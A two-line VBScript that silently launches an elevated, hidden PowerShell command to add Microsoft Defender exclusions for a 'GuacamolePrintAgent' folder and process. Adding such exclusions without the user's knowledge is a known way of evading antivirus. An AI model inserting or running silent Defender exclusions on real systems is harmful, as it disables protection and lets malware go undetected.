Set shell = CreateObject("Shell.Application")
shell.ShellExecute "powershell.exe", "-NoProfile -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files\GuacamolePrintAgent'; Add-MpPreference -ExclusionProcess 'GuacamolePrintAgent.exe'""", "", "runas", 0
